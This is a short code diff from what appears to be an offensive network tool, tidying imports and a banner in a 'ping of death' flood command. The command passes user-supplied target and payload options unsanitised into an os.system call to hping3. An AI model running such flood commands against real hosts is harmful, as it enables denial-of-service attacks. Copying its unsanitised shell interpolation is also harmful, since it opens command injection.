@@ -1,5 +1,6 @@
-import click
 import os
+
+import click
 
 
 @click.command("ping_of_death", help="attack vimim with ping of death attack")
@@ -10,7 +11,7 @@ import os
 @click.pass_context
 def ping_of_death(ctx, target, payload, ddos, num):
     click.echo(
-        "\n\n-------------------- ping of death flood attack ---------------------\n"
+        "-------------------- ping of death flood attack ---------------------\n"
     )
     os.system(
         "$(which hping3) %s -q --icmp -n -d %s -p 80 %s %s"
